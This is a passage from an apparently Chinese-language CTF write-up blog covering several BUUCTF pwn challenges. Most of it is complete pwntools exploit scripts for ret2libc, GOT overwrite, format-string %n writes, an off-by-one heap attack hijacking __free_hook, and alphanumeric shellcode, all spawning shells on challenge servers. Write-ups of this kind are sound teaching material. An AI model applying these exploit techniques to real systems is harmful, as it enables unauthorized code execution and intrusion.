punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其次可以直接用<code>ret2libc</code>来<code>getshell</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_start_main <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> <span class="token number">0x80486F8</span>pop_ebp_ret <span class="token operator">=</span> <span class="token number">0x08048680</span>ret <span class="token operator">=</span> <span class="token number">0x080483f2</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input:'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a><a href="https://buuoj.cn/challenges#picoctf_2018_got_shell">picoctf_2018_got_shell</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;picoctf_2018_got_shell&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反汇编查看</p><pre class="line-numbers language-none"><code class="language-none">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  _DWORD *v3; &#x2F;&#x2F; [esp+14h] [ebp-114h] BYREF  int v4; &#x2F;&#x2F; [esp+18h] [ebp-110h] BYREF  char s[256]; &#x2F;&#x2F; [esp+1Ch] [ebp-10Ch] BYREF  unsigned int v6; &#x2F;&#x2F; [esp+11Ch] [ebp-Ch]  v6 &#x3D; __readgsdword(0x14u);  setvbuf(_bss_start, 0, 2, 0);  puts(&quot;I&#39;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;);  __isoc99_scanf(&quot;%x&quot;, &amp;v3);  sprintf(s, &quot;Okay, now what value would you like to write to 0x%x&quot;, v3);  puts(s);  __isoc99_scanf(&quot;%x&quot;, &amp;v4);  sprintf(s, &quot;Okay, writing 0x%x to 0x%x&quot;, v4, v3);  puts(s);  *v3 &#x3D; v4;  puts(&quot;Okay, exiting now...\n&quot;);  exit(1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以直接向一个地址写入内容，还有<code>win</code>函数，直接改返回地址为<code>win</code>函数地址即可<code>getshell</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26366</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x804A014</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Okay, now what value would you like to write to"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x804854B</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Okay, exiting now...'</span><span class="token punctuation">,</span> <span class="token string">b'cat flag.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a><a href="https://buuoj.cn/challenges#mrctf2020_easy_equation">mrctf2020_easy_equation</a></h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s; &#x2F;&#x2F; [rsp+Fh] [rbp-1h] BYREF  memset(&amp;s, 0, 0x400uLL);  fgets(&amp;s, 0x3FF, stdin);  printf(&amp;s);  if ( 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge &#x3D;&#x3D; 198 )    system(&quot;exec &#x2F;bin&#x2F;sh&quot;);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保护只开了堆栈不可执行，看程序简单计算一下<code>judge</code>为<code>2</code>时直接<code>getshell</code>，存在栈上的格式化字符串，直接用<code>%c</code>方法会零截断，但是<code>%n</code>的用法根本上是将<code>%n</code>之前<code>printf</code>已经打印的字符个数赋值给偏移处指针所指向的地址位置，那么只要控制<code>n</code>前字符个数就可以覆盖为一个确定的小数字了</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28623</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'aa%9$naaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x060105C</span><span class="token punctuation">)</span> r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a><a href="https://buuoj.cn/challenges#npuctf_2020_easyheap">npuctf_2020_easyheap</a></h2><p>一个堆题没开地址随机化的堆题，分析一下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 edit()&#123;  unsigned int v1; &#x2F;&#x2F; [rsp+0h] [rbp-10h]  char buf[4]; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-8h]  v3 &#x3D; __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  v1 &#x3D; atoi(buf);  if ( v1 &gt;&#x3D; 0xA )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( heaparray[v1] )  &#123;    printf(&quot;Content: &quot;);    read_input(*(_QWORD *)&amp;heaparray[v1]-&gt;addr, heaparray[v1]-&gt;size + 1);&#x2F;&#x2F; vuln    puts(&quot;Done!&quot;);  &#125;  else  &#123;    puts(&quot;How Dare you!&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>edit</code>函数中存在一个<code>off-by-one</code>漏洞，程序中存在一个<code>heaparry</code>的堆管理，且在<code>edit</code>和<code>show</code>的时候都是直接将<code>heaparry</code>中指向的地址视为目标堆，因此需要控制堆管理</p><p>先<code>add</code>两个堆，实际创建的是四个堆，其中两个用于堆管理，利用<code>off-by-one</code>改第三个堆大小覆盖掉第四个堆，释放第三个堆之后<code>tcache</code>中存在两个堆，一个是合并之后的一个是第四个堆，此时再创建一个大小为合并之后的堆时它的堆管理就在第四个堆的位置，而第三个堆又能覆写第四个堆，即能够改写堆管理中的大小和地址</p><p>将堆管理中的地址设置成<code>got</code>表中的一个地址再<code>show</code>就能得到<code>libc</code>基址，同理改成<code>__free_hook</code>之后<code>edit</code>就能改<code>__free_hook</code>为<code>system</code></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28422</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size of Heap(0x10 or 0x20 only) : '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token string">b'\x41'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x809c0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x41'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a><a href="https://buuoj.cn/challenges#mrctf2020_shellcode_revenge">mrctf2020_shellcode_revenge</a></h2><p>可见字符<code>shellcode</code>，程序中含有可执行段，反编译失败只能看汇编</p><pre class="line-numbers language-none"><code class="language-none">.text:00000000000011B8                               loc_11B8:                               ; CODE XREF: main+EB↓j.text:00000000000011B8 8B 45 FC                      mov     eax, [rbp+var_4].text:00000000000011BB 48 98                         cdqe.text:00000000000011BD 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011C5 3C 60                         cmp     al, 60h ; &#39;&#96;&#39;.text:00000000000011C7 7E 11                         jle     short loc_11DA.text:00000000000011C7.text:00000000000011C9 8B 45 FC                      mov     eax, [rbp+var_4].text:00000000000011CC 48 98                         cdqe.text:00000000000011CE 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011D6 3C 7A                         cmp     al, 7Ah ; &#39;z&#39;.text:00000000000011D8 7E 5C                         jle     short loc_1236.text:00000000000011D8.text:00000000000011DA.text:00000000000011DA                               loc_11DA:                               ; CODE XREF: main+72↑j.text:00000000000011DA 8B 45 FC                      mov     eax, [rbp+var_4].text:00000000000011DD 48 98                         cdqe.text:00000000000011DF 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011E7 3C 40                         cmp     al, 40h ; &#39;@&#39;.text:00000000000011E9 7E 11                         jle     short loc_11FC.text:00000000000011E9.text:00000000000011EB 8B 45 FC                      mov     eax, [rbp+var_4].text:00000000000011EE 48 98                         cdqe.text:00000000000011F0 0F B6 84 05 F0 FB FF FF       movzx   eax, [rbp+rax+buf].text:00000000000011F8 3C 5A                         cmp     al, 5Ah ; &#39;Z&#39;.text:00000000000011FA 7E 3A                         jle     short loc_1236<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入字符的<code>ascii</code>码要在<code>(60,74)||(2f,5a)</code>区间内，因此要将生成的<code>shellcode</code>转化成可见字符，要利用<code>alpha3</code>工具</p><p>先生成<code>shellcode</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token 